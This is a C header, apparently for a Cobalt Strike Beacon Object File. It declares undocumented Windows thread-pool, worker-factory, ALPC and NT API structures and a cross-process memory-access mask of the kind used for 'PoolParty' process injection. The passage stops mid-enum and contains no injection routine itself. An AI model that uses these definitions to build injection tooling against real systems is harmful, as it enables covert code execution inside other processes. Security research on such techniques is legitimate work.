#pragma once

#include <windows.h>
#include "beacon.h"
#include <stdint.h>
#include <stddef.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_BUFFER_OVERFLOW ((NTSTATUS)0x80000005L)
#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
#define WORKER_FACTORY_RELEASE_WORKER 0x0001
#define WORKER_FACTORY_WAIT 0x0002
#define WORKER_FACTORY_SET_INFORMATION 0x0004
#define WORKER_FACTORY_QUERY_INFORMATION 0x0008
#define WORKER_FACTORY_READY_WORKER 0x0010
#define WORKER_FACTORY_SHUTDOWN 0x0020
#define WORKER_FACTORY_ALL_ACCESS ( \
       STANDARD_RIGHTS_REQUIRED | \
       WORKER_FACTORY_RELEASE_WORKER | \
       WORKER_FACTORY_WAIT | \
       WORKER_FACTORY_SET_INFORMATION | \
       WORKER_FACTORY_QUERY_INFORMATION | \
       WORKER_FACTORY_READY_WORKER | \
       WORKER_FACTORY_SHUTDOWN \
)
#ifndef IO_COMPLETION_MODIFY_STATE
#define IO_COMPLETION_MODIFY_STATE 0x0002
#endif
#ifndef TIMER_QUERY_STATE
#define TIMER_QUERY_STATE 0x0001
#endif
#ifndef TIMER_MODIFY_STATE
#define TIMER_MODIFY_STATE 0x0002
#endif
#ifndef CREATE_WAITABLE_TIMER_HIGH_RESOLUTION
#define CREATE_WAITABLE_TIMER_HIGH_RESOLUTION 0x00000002
#endif
#ifndef PP_OPEN_PROCESS_ACCESS
#define PP_OPEN_PROCESS_ACCESS (PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION)
#endif
#ifndef GENERIC_ALL
#define GENERIC_ALL 0x10000000L
#endif
#ifndef STATUS_TIMEOUT
#define STATUS_TIMEOUT ((NTSTATUS)0x00000102L)
#endif
#ifndef STATUS_IO_TIMEOUT
#define STATUS_IO_TIMEOUT ((NTSTATUS)0xC00000B5L)
#endif
#ifndef STATUS_OBJECT_NAME_COLLISION
#define STATUS_OBJECT_NAME_COLLISION ((NTSTATUS)0xC0000035L)
#endif
#ifndef IMAGE_FILE_MACHINE_ARM64
#define IMAGE_FILE_MACHINE_ARM64 0xAA64
#endif
#ifndef IMAGE_FILE_MACHINE_AMD64
#define IMAGE_FILE_MACHINE_AMD64 0x8664
#endif
#ifndef IMAGE_FILE_MACHINE_UNKNOWN
#define IMAGE_FILE_MACHINE_UNKNOWN 0
#endif
#define PP_ARCH_NATIVE 0
#define PP_ARCH_WOW64 1
#define PP_ARCH_UNKNOWN 2
#define PP_INFO_MAX 0x00800000u
#define PP_INFO_RETRIES 8
#define PP_NAME_RETRY 8

// ---------//
// Structs //
// --------//

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;


typedef struct _TP_TASK_CALLBACKS
{
    void* ExecuteCallback;
    void* Unposted;
} TP_TASK_CALLBACKS, * PTP_TASK_CALLBACKS;

typedef struct _TP_TASK
{
    struct _TP_TASK_CALLBACKS* Callbacks;
    UINT32 NumaNode;
    UINT8 IdealProcessor;
    char Padding_242[3];
    struct _LIST_ENTRY ListEntry;
} TP_TASK, * PTP_TASK;

typedef struct _TPP_REFCOUNT
{
    volatile INT32 Refcount;
} TPP_REFCOUNT, * PTPP_REFCOUNT;

typedef struct _TPP_CALLER
{
    void* ReturnAddress;
} TPP_CALLER, * PTPP_CALLER;

typedef struct _TPP_PH
{
    struct _TPP_PH_LINKS* Root;
} TPP_PH, * PTPP_PH;

typedef struct _TP_DIRECT
{
    struct _TP_TASK Task;
    UINT64 Lock;
    struct _LIST_ENTRY IoCompletionInformationList;
    void* Callback;
    UINT32 NumaNode;
    UINT8 IdealProcessor;
    char __PADDING__[3];
} TP_DIRECT, * PTP_DIRECT;

typedef struct _TPP_TIMER_SUBQUEUE
{
    INT64 Expiration;
    struct _TPP_PH WindowStart;
    struct _TPP_PH WindowEnd;
    void* Timer;
    void* TimerPkt;
    struct _TP_DIRECT Direct;
    UINT32 ExpirationWindow;
    INT32 __PADDING__[1];
} TPP_TIMER_SUBQUEUE, * PTPP_TIMER_SUBQUEUE;

typedef struct _TPP_TIMER_QUEUE
{
    struct _RTL_SRWLOCK Lock;
    struct _TPP_TIMER_SUBQUEUE AbsoluteQueue;
    struct _TPP_TIMER_SUBQUEUE RelativeQueue;
    INT32 AllocatedTimerCount;
    INT32 __PADDING__[1];
} TPP_TIMER_QUEUE, * PTPP_TIMER_QUEUE;

typedef struct _TPP_NUMA_NODE
{
    INT32 WorkerCount;
} TPP_NUMA_NODE, * PTPP_NUMA_NODE;

typedef union _TPP_POOL_QUEUE_STATE
{
    union
    {
        INT64 Exchange;
        struct
        {
            INT32 RunningThreadGoal : 16;
            UINT32 PendingReleaseCount : 16;
            UINT32 QueueLength;
        };
    };
} TPP_POOL_QUEUE_STATE, * PTPP_POOL_QUEUE_STATE;

typedef struct _TPP_QUEUE
{
    struct _LIST_ENTRY Queue;
    struct _RTL_SRWLOCK Lock;
} TPP_QUEUE, * PTPP_QUEUE;

typedef struct _FULL_TP_POOL
{
    struct _TPP_REFCOUNT Refcount;
    long Padding_239;
    union _TPP_POOL_QUEUE_STATE QueueState;
    struct _TPP_QUEUE* TaskQueue[3];
    struct _TPP_NUMA_NODE* NumaNode;
    struct _GROUP_AFFINITY* ProximityInfo;
    void* WorkerFactory;
    void* CompletionPort;
    struct _RTL_SRWLOCK Lock;
    struct _LIST_ENTRY PoolObjectList;
    struct _LIST_ENTRY WorkerList;
    struct _TPP_TIMER_QUEUE TimerQueue;
    struct _RTL_SRWLOCK ShutdownLock;
    UINT8 ShutdownInitiated;
    UINT8 Released;
    UINT16 PoolFlags;
    long Padding_240;
    struct _LIST_ENTRY PoolLinks;
    struct _TPP_CALLER AllocCaller;
    struct _TPP_CALLER ReleaseCaller;
    volatile INT32 AvailableWorkerCount;
    volatile INT32 LongRunningWorkerCount;
    UINT32 LastProcCount;
    volatile INT32 NodeStatus;
    volatile INT32 BindingCount;
    UINT32 CallbackChecksDisabled : 1;
    UINT32 TrimTarget : 11;
    UINT32 TrimmedThrdCount : 11;
    UINT32 SelectedCpuSetCount;
    long Padding_241;
    struct _RTL_CONDITION_VARIABLE TrimComplete;
    struct _LIST_ENTRY TrimmedWorkerList;
} FULL_TP_POOL, * PFULL_TP_POOL;

typedef struct _ALPC_WORK_ON_BEHALF_TICKET
{
    UINT32 ThreadId;
    UINT32 ThreadCreationTimeLow;
} ALPC_WORK_ON_BEHALF_TICKET, * PALPC_WORK_ON_BEHALF_TICKET;

typedef union _TPP_WORK_STATE
{
    union
    {
        INT32 Exchange;
        UINT32 Insertable : 1;
        UINT32 PendingCallbackCount : 31;
    };
} TPP_WORK_STATE, * PTPP_WORK_STATE;

typedef struct _TPP_ITE_WAITER
{
    struct _TPP_ITE_WAITER* Next;
    void* ThreadId;
} TPP_ITE_WAITER, * PTPP_ITE_WAITER;

typedef struct _TPP_PH_LINKS
{
    struct _LIST_ENTRY Siblings;
    struct _LIST_ENTRY Children;
    INT64 Key;
} TPP_PH_LINKS, * PTPP_PH_LINKS;

typedef struct _TPP_ITE
{
    struct _TPP_ITE_WAITER* First;
} TPP_ITE, * PTPP_ITE;

typedef union _TPP_FLAGS_COUNT
{
    union
    {
        UINT64 Count : 60;
        UINT64 Flags : 4;
        INT64 Data;
    };
} TPP_FLAGS_COUNT, * PTPP_FLAGS_COUNT;

typedef struct _TPP_BARRIER
{
    volatile union _TPP_FLAGS_COUNT Ptr;
    struct _RTL_SRWLOCK WaitLock;
    struct _TPP_ITE WaitList;
} TPP_BARRIER, * PTPP_BARRIER;

typedef struct _TP_CLEANUP_GROUP
{
    struct _TPP_REFCOUNT Refcount;
    INT32 Released;
    struct _RTL_SRWLOCK MemberLock;
    struct _LIST_ENTRY MemberList;
    struct _TPP_BARRIER Barrier;
    struct _RTL_SRWLOCK CleanupLock;
    struct _LIST_ENTRY CleanupList;
} TP_CLEANUP_GROUP, * PTP_CLEANUP_GROUP;


typedef struct _TPP_CLEANUP_GROUP_MEMBER
{
    struct _TPP_REFCOUNT Refcount;
    long Padding_233;
    const struct _TPP_CLEANUP_GROUP_MEMBER_VFUNCS* VFuncs;
    struct _TP_CLEANUP_GROUP* CleanupGroup;
    void* CleanupGroupCancelCallback;
    void* FinalizationCallback;
    struct _LIST_ENTRY CleanupGroupMemberLinks;
    struct _TPP_BARRIER CallbackBarrier;
    union
    {
        void* Callback;
        void* WorkCallback;
        void* SimpleCallback;
        void* TimerCallback;
        void* WaitCallback;
        void* IoCallback;
        void* AlpcCallback;
        void* AlpcCallbackEx;
        void* JobCallback;
    };
    void* Context;
    struct _ACTIVATION_CONTEXT* ActivationContext;
    void* SubProcessTag;
    struct _GUID ActivityId;
    struct _ALPC_WORK_ON_BEHALF_TICKET WorkOnBehalfTicket;
    void* RaceDll;
    FULL_TP_POOL* Pool;
    struct _LIST_ENTRY PoolObjectLinks;
    union
    {
        volatile INT32 Flags;
        UINT32 LongFunction : 1;
        UINT32 Persistent : 1;
        UINT32 UnusedPublic : 14;
        UINT32 Released : 1;
        UINT32 CleanupGroupReleased : 1;
        UINT32 InCleanupGroupCleanupList : 1;
        UINT32 UnusedPrivate : 13;
    };
    long Padding_234;
    struct _TPP_CALLER AllocCaller;
    struct _TPP_CALLER ReleaseCaller;
    enum _TP_CALLBACK_PRIORITY CallbackPriority;
    INT32 __PADDING__[1];
} TPP_CLEANUP_GROUP_MEMBER, * PTPP_CLEANUP_GROUP_MEMBER;

typedef struct _FULL_TP_WORK
{
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    struct _TP_TASK Task;
    volatile union _TPP_WORK_STATE WorkState;
    INT32 __PADDING__[1];
} FULL_TP_WORK, * PFULL_TP_WORK;

typedef struct _FULL_TP_TIMER
{
    struct _FULL_TP_WORK Work;
    struct _RTL_SRWLOCK Lock;
    union
    {
        struct _TPP_PH_LINKS WindowEndLinks;
        struct _LIST_ENTRY ExpirationLinks;
    };
    struct _TPP_PH_LINKS WindowStartLinks;
    INT64 DueTime;
    struct _TPP_ITE Ite;
    UINT32 Window;
    UINT32 Period;
    UINT8 Inserted;
    UINT8 WaitTimer;
    union
    {
        UINT8 TimerStatus;
        UINT8 InQueue : 1;
        UINT8 Absolute : 1;
        UINT8 Cancelled : 1;
    };
    UINT8 BlockInsert;
    INT32 __PADDING__[1];
} FULL_TP_TIMER, * PFULL_TP_TIMER;

typedef struct _FULL_TP_WAIT
{
    struct _FULL_TP_TIMER Timer;
    void* Handle;
    void* WaitPkt;
    void* NextWaitHandle;
    union _LARGE_INTEGER NextWaitTimeout;
    struct _TP_DIRECT Direct;
    union
    {
        union
        {
            UINT8 AllFlags;
            UINT8 NextWaitActive : 1;
            UINT8 NextTimeoutActive : 1;
            UINT8 CallbackCounted : 1;
            UINT8 Spare : 5;
        };
    } WaitFlags;
    char __PADDING__[7];
} FULL_TP_WAIT, * PFULL_TP_WAIT;

typedef struct _FULL_TP_IO
{
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    struct _TP_DIRECT Direct;
    void* File;
    volatile INT32 PendingIrpCount;
    INT32 __PADDING__[1];
} FULL_TP_IO, * PFULL_TP_IO;

typedef struct _FULL_TP_ALPC
{
    struct _TP_DIRECT Direct;
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    void* AlpcPort;
    INT32 DeferredSendCount;
    INT32 LastConcurrencyCount;
    union
    {
        UINT32 Flags;
        UINT32 ExTypeCallback : 1;
        UINT32 CompletionListRegistered : 1;
        UINT32 Reserved : 30;
    };
    INT32 __PADDING__[1];
} FULL_TP_ALPC, * PFULL_TP_ALPC;

typedef struct _T2_SET_PARAMETERS_V0
{
    ULONG Version;
    ULONG Reserved;
    LONGLONG NoWakeTolerance;
} T2_SET_PARAMETERS, * PT2_SET_PARAMETERS;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation = 0,
    ProcessDebugPort = 7,
    ProcessWow64Information = 26,
    ProcessImageFileName = 27,
    ProcessBreakOnTermination = 29
} PROCESSINFOCLASS;

typedef enum _OBJECT_INFORMATION_CLASS {
    ObjectBasicInformation = 0,
    ObjectTypeInformation = 2
} OBJECT_INFORMATION_CLASS;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
    HANDLE HandleValue;
    ULONG_PTR HandleCount;
    ULONG_PTR PointerCount;
    ACCESS_MASK GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
    ULONG_PTR NumberOfHandles;
    ULONG_PTR Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[ANYSIZE_ARRAY];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef enum
{
    ProcessHandleInformation = 51
} PROCESS_INFOCLASS;

typedef struct __PUBLIC_OBJECT_TYPE_INFORMATION {
    UNICODE_STRING TypeName;
    ULONG Reserved[22];    // reserved for internal use
} PUBLIC_OBJECT_TYPE_INFORMATION, * PPUBLIC_OBJECT_TYPE_INFORMATION;

typedef struct _WORKER_FACTORY_BASIC_INFORMATION
{
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TimerSet;
    BOOLEAN QueuedToExWorker;
    BOOLEAN MayCreate;
    BOOLEAN CreateInProgress;
    BOOLEAN InsertedIntoQueue;
    BOOLEAN Shutdown;
    ULONG BindingCount;
    ULONG ThreadMinimum;
    ULONG ThreadMaximum;
    ULONG PendingWorkerCount;
    ULONG WaitingWorkerCount;
    ULONG TotalWorkerCount;
    ULONG ReleaseCount;
    LONGLONG InfiniteWaitGoal;
    PVOID StartRoutine;
    PVOID StartParameter;
    HANDLE ProcessId;
    SIZE_T StackReserve;
    SIZE_T StackCommit;
    NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION, * PWORKER_FACTORY_BASIC_INFORMATION;


typedef NTSTATUS(NTAPI* _NtSetTimer2)(
    HANDLE TimerHandle,
    PLARGE_INTEGER DueTime,
    PLARGE_INTEGER Period,
    PT2_SET_PARAMETERS Parameters
    );

typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );


typedef NTSTATUS(NTAPI* _NtQueryObject)(
    HANDLE Handle,
    OBJECT_INFORMATION_CLASS ObjectInformationClass,
    PVOID ObjectInformation,
    ULONG ObjectInformationLength,
    PULONG ReturnLength
    );

typedef enum _QUERY_WORKERFACTORYINFOCLASS
{
    WorkerFactoryBasicInformation = 7,
} QUERY_WORKERFACTORYINFOCLASS, * PQUERY_WORKERFACTORYINFOCLASS;

typedef NTSTATUS(NTAPI* _NtQueryInformationWorkerFactory)(
    HANDLE WorkerFactoryHandle,
    QUERY_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* _ZwSetIoCompletion)(
    HANDLE IoCompletionHandle,
    PVOID KeyContext,
    PVOID ApcContext,
    NTSTATUS IoStatus,
    ULONG_PTR IoStatusInformation
);

typedef struct _FULL_TP_JOB
{
    struct _TP_DIRECT Direct;
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    void* JobHandle;
    union
    {
        volatile int64_t CompletionState;
        int64_t Rundown : 1;
        int64_t CompletionCount : 63;
    };
    struct _RTL_SRWLOCK RundownLock;
} FULL_TP_JOB, * PFULL_TP_JOB;

_Static_assert(sizeof(TP_DIRECT) >= sizeof(TP_TASK) + sizeof(UINT64) + sizeof(LIST_ENTRY) + sizeof(void *), "TP_DIRECT layout");
_Static_assert(sizeof(FULL_TP_IO) >= sizeof(TPP_CLEANUP_GROUP_MEMBER) + sizeof(TP_DIRECT), "FULL_TP_IO layout");
_Static_assert(sizeof(FULL_TP_ALPC) >= sizeof(TP_DIRECT) + sizeof(TPP_CLEANUP_GROUP_MEMBER), "FULL_TP_ALPC layout");
_Static_assert(sizeof(FULL_TP_JOB) >= sizeof(TP_DIRECT) + sizeof(TPP_CLEANUP_GROUP_MEMBER), "FULL_TP_JOB layout");
_Static_assert(sizeof(FULL_TP_TIMER) >= sizeof(FULL_TP_WORK) + sizeof(TPP_PH_LINKS), "FULL_TP_TIMER layout");

typedef NTSTATUS (NTAPI* _TpAllocJobNotification)(
    PFULL_TP_JOB* JobReturn,
    HANDLE HJob,
    PVOID Callback,
    PVOID Context,
    PTP_CALLBACK_ENVIRON CallbackEnviron
);

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _ALPC_PORT_ATTRIBUTES
{
    ULONG Flags;
    SECURITY_QUALITY_OF_SERVICE SecurityQos;
    SIZE_T MaxMessageLength;
    SIZE_T MemoryBandwidth;
    SIZE_T MaxPoolUsage;
    SIZE_T MaxSectionSize;
    SIZE_T MaxViewSize;
    SIZE_T MaxTotalSectionSize;
    ULONG DupObjectTypes;
#ifdef _WIN64
    ULONG Reserved;
#endif
} ALPC_PORT_ATTRIBUTES, * PALPC_PORT_ATTRIBUTES;


typedef NTSTATUS(NTAPI *_NtAlpcCreatePort)(
    PHANDLE PortHandle,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PALPC_PORT_ATTRIBUTES PortAttributes
);

typedef struct _TP_ALPC TP_ALPC, * PTP_ALPC;

typedef VOID(NTAPI* PTP_ALPC_CALLBACK)(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PTP_ALPC Alpc
);

typedef NTSTATUS( NTAPI* _TpAllocAlpcCompletion)(
    PFULL_TP_ALPC* AlpcReturn,
    HANDLE AlpcPort,
    PTP_ALPC_CALLBACK Callback,
    PVOID Context,
    PTP_CALLBACK_ENVIRON CallbackEnviron
);

typedef struct _ALPC_PORT_ASSOCIATE_COMPLETION_PORT
{
    PVOID CompletionKey;
    HANDLE CompletionPort;
} ALPC_PORT_ASSOCIATE_COMPLETION_PORT, * PALPC_PORT_ASSOCIATE_COMPLETION_PORT;

// private
typedef enum _ALPC_PORT_INFORMATION_CLASS
{
    AlpcBasicInformation, // q: out ALPC_BASIC_INFORMATION
    AlpcPortInformation, // s: in ALPC_PORT_ATTRIBUTES
    AlpcAssociateCompletionPortInformation, // s: in ALPC_PORT_ASSOCIATE_COMPLETION_PORT
    AlpcConnectedSIDInformation, // q: in SID
    AlpcServerInformation, // q: inout ALPC_SERVER_INFORMATION
    AlpcMessageZoneInformation, // s: in ALPC_PORT_MESSAGE_ZONE_INFORMATION
    AlpcRegisterCompletionListInformation, // s: in ALPC_PORT_COMPLETION_LIST_INFORMATION
    AlpcUnregisterCompletionListInformation, // s: VOID
    AlpcAdjustCompletionListConcurrencyCountInformation, // s: in ULONG
    AlpcRegisterCallbackInformation, // s: ALPC_REGISTER_CALLBACK // kernel-mode only
    AlpcCompletionListRundownInformation, // s: VOID // 10
    AlpcWaitForPortReferences,
    AlpcServerSessionInformation // q: ALPC_SERVER_SESSION_INFORMATION // since 19H2
} ALPC_PORT_INFORMATION_CLASS;


typedef NTSTATUS (NTAPI* _NtAlpcSetInformation)(
    HANDLE PortHandle,
    ALPC_PORT_INFORMATION_CLASS PortInformationClass,
    PVOID PortInformation,
    ULONG Length
);

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef struct _PORT_MESSAGE
{
    union
    {
        struct
        {
            USHORT DataLength;
            USHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union
    {
        struct
        {
            USHORT Type;
            USHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    union
    {
        CLIENT_ID ClientId;
        double DoNotUseThisField;
    };
    ULONG MessageId;
    union
    {
        SIZE_T ClientViewSize; // only valid for LPC_CONNECTION_REQUEST messages
        ULONG CallbackId; // only valid for LPC_REQUEST messages
    };
} PORT_MESSAGE, * PPORT_MESSAGE;
typedef struct _ALPC_MESSAGE {
    PORT_MESSAGE PortHeader;
    BYTE PortMessage[1000];
} ALPC_MESSAGE, * PALPC_MESSAGE;

typedef struct _ALPC_MESSAGE_ATTRIBUTES
{
    ULONG AllocatedAttributes;
    ULONG ValidAttributes;
} ALPC_MESSAGE_ATTRIBUTES, * PALPC_MESSAGE_ATTRIBUTES;

typedef NTSTATUS (NTAPI* _NtAlpcConnectPort)(
    PHANDLE PortHandle,
    PUNICODE_STRING PortName,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PALPC_PORT_ATTRIBUTES PortAttributes,
    ULONG Flags,
    PSID RequiredServerSid,
    PPORT_MESSAGE ConnectionMessage,
    PSIZE_T BufferLength,
    PALPC_MESSAGE_ATTRIBUTES OutMessageAttributes,
    PALPC_MESSAGE_ATTRIBUTES InMessageAttributes,
    PLARGE_INTEGER Timeout
);

typedef struct _IO_STATUS_BLOCK
{
    union
    {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _FILE_COMPLETION_INFORMATION
{
    HANDLE Port;
    PVOID Key;
} FILE_COMPLETION_INFORMATION, * PFILE_COMPLETION_INFORMATION;

typedef enum _FILE_INFORMATION_CLASS
{
    FileDirectoryInformation = 1, // q: FILE_DIRECTORY_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileFullDirectoryInformation, // q: FILE_FULL_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileBothDirectoryInformation, // q: FILE_BOTH_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileBasicInformation, // q; s: FILE_BASIC_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileStandardInformation, // q: FILE_STANDARD_INFORMATION, FILE_STANDARD_INFORMATION_EX
    FileInternalInformation, // q: FILE_INTERNAL_INFORMATION
    FileEaInformation, // q: FILE_EA_INFORMATION
    FileAccessInformation, // q: FILE_ACCESS_INFORMATION
    FileNameInformation, // q: FILE_NAME_INFORMATION
    FileRenameInformation, // s: FILE_RENAME_INFORMATION (requires DELETE) // 10
    FileLinkInformation, // s: FILE_LINK_INFORMATION
    FileNamesInformation, // q: FILE_NAMES_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileDispositionInformation, // s: FILE_DISPOSITION_INFORMATION (requires DELETE)
    FilePositionInformation, // q; s: FILE_POSITION_INFORMATION
    FileFullEaInformation, // FILE_FULL_EA_INFORMATION
    FileModeInformation, // q; s: FILE_MODE_INFORMATION
    FileAlignmentInformation, // q: FILE_ALIGNMENT_INFORMATION
    FileAllInformation, // q: FILE_ALL_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileAllocationInformation, // s: FILE_ALLOCATION_INFORMATION (requires FILE_WRITE_DATA)
    FileEndOfFileInformation, // s: FILE_END_OF_FILE_INFORMATION (requires FILE_WRITE_DATA) // 20
    FileAlternateNameInformation, // q: FILE_NAME_INFORMATION
    FileStreamInformation, // q: FILE_STREAM_INFORMATION
    FilePipeInformation, // q; s: FILE_PIPE_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FilePipeLocalInformation, // q: FILE_PIPE_LOCAL_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FilePipeRemoteInformation, // q; s: FILE_PIPE_REMOTE_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileMailslotQueryInformation, // q: FILE_MAILSLOT_QUERY_INFORMATION
    FileMailslotSetInformation, // s: FILE_MAILSLOT_SET_INFORMATION
    FileCompressionInformation, // q: FILE_COMPRESSION_INFORMATION
    FileObjectIdInformation, // q: FILE_OBJECTID_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileCompletionInformation, // s: FILE_COMPLETION_INFORMATION // 30
    FileMoveClusterInformation, // s: FILE_MOVE_CLUSTER_INFORMATION (requires FILE_WRITE_DATA)
    FileQuotaInformation, // q: FILE_QUOTA_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileReparsePointInformation, // q: FILE_REPARSE_POINT_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileNetworkOpenInformation, // q: FILE_NETWORK_OPEN_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileAttributeTagInformation, // q: FILE_ATTRIBUTE_TAG_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileTrackingInformation, // s: FILE_TRACKING_INFORMATION (requires FILE_WRITE_DATA)
    FileIdBothDirectoryInformation, // q: FILE_ID_BOTH_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileIdFullDirectoryInformation, // q: FILE_ID_FULL_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileValidDataLengthInformation, // s: FILE_VALID_DATA_LENGTH_INFORMATION (requires FILE_WRITE_DATA and/or SeManageVolumePrivilege)
    FileShortNameInformation, // s: FILE_NAME_INFORMATION (requires DELETE) // 40
    FileIoCompletionNotificationInformation, // q; s: FILE_IO_COMPLETION_NOTIFICATION_INFORMATION (q: requires FILE_READ_ATTRIBUTES) // since VISTA
    FileIoStatusBlockRangeInformation, // s: FILE_IOSTATUSBLOCK_RANGE_INFORMATION (requires SeLockMemoryPrivilege)
    FileIoPriorityHintInformation, // q; s: FILE_IO_PRIORITY_HINT_INFORMATION, FILE_IO_PRIORITY_HINT_INFORMATION_EX (q: requires FILE_READ_DATA)
    FileSfioReserveInformation, // q; s: FILE_SFIO_RESERVE_INFORMATION (q: requires FILE_READ_DATA)
    FileSfioVolumeInformation, // q: FILE_SFIO_VOLUME_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileHardLinkInformation, // q: FILE_LINKS_INFORMATION
    FileProcessIdsUsingFileInformation, // q: FILE_PROCESS_IDS_USING_FILE_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileNormalizedNameInformation, // q: FILE_NAME_INFORMATION
    FileNetworkPhysicalNameInformation, // q: FILE_NETWORK_PHYSICAL_NAME_INFORMATION
    FileIdGlobalTxDirectoryInformation, // q: FILE_ID_GLOBAL_TX_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex]) // since WIN7 // 50
    FileIsRemoteDeviceInformation, // q: FILE_IS_REMOTE_DEVICE_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileUnusedInformation,
    FileNumaNodeInformation, // q: FILE_NUMA_NODE_INFORMATION
    FileStandardLinkInformation, // q: FILE_STANDARD_LINK_INFORMATION
    FileRemoteProtocolInformation, // q: FILE_REMOTE_PROTOCOL_INFORMATION
    FileRenameInformationBypassAccessCheck, // (kernel-mode only); s: FILE_RENAME_INFORMATION // since WIN8
    FileLinkInformationBypassAccessCheck, // (kernel-mode only); s: FILE_LINK_INFORMATION
    FileVolumeNameInformation, // q: FILE_VOLUME_NAME_INFORMATION
    FileIdInformation, // q: FILE_ID_INFORMATION
    FileIdExtdDirectoryInformation, // q: FILE_ID_EXTD_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex]) // 60
    FileReplaceCompletionInformation, // s: FILE_COMPLETION_INFORMATION // since WINBLUE
    FileHardLinkFullIdInformation, // q: FILE_LINK_ENTRY_FULL_ID_INFORMATION // FILE_LINKS_FULL_ID_INFORMATION
    FileIdExtdBothDirectoryInformation, // q: FILE_ID_EXTD_BOTH_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex]) // since THRESHOLD
    FileDispositionInformationEx, // s: FILE_DISPOSITION_INFO_EX (requires DELETE) // since REDSTONE
    FileRenameInformationEx, // s: FILE_RENAME_INFORMATION_EX
    FileRenameInformationExBypassAccessCheck, // (kernel-mode only); s: FILE_RENAME_INFORMATION_EX
    FileDesiredStorageClassInformation, // q; s: FILE_DESIRED_STORAGE_CLASS_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES) // since REDSTONE2
    FileStatInformation, // q: FILE_STAT_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileMemoryPartitionInformation, // s: FILE_MEMORY_PARTITION_INFORMATION // since REDSTONE3
    FileStatLxInformation, // q: FILE_STAT_LX_INFORMATION (requires FILE_READ_ATTRIBUTES and FILE_READ_EA) // since REDSTONE4 // 70
